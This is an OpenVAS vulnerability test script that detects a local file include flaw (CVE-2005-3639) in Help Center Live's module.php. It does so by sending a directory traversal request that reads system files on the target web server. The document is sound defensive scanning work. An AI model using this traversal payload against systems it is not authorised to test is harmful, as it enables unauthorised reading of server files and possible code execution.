###############################################################################
# OpenVAS Vulnerability Test
# $Id: hcl_file_include.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Help Center Live module.php local file include flaw
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Ref: HACKERS PAL

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20223");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-3639");
  script_bugtraq_id(15404);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Help Center Live module.php local file include flaw");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The remote web server contains a PHP script that is affected by a
  local file file include vulnerability.

  Description :

  The remote host is running Help Center Live, a help desk tool written in
  PHP.

  The remote version of Help Center Live fails to sanitize input to the
  'file' parameter of the 'module.php' script before using it in a PHP
  include_once() function.  An attacker can exploit this issue to read
  files and possibly execute arbitrary PHP code on the local host subject
  to the privileges of the web server user id.");

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  foreach pattern( keys( files ) ) {

    file = files[pattern];

    if( dir == "/" ) dir = "";
    url = dir + "/module.php?module=osTicket&file=/../../../../../../../../../../../" + file;

    if( http_vuln_check( port:port, url:url, pattern:pattern, extra_check:"Powered By Help Center Live" ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );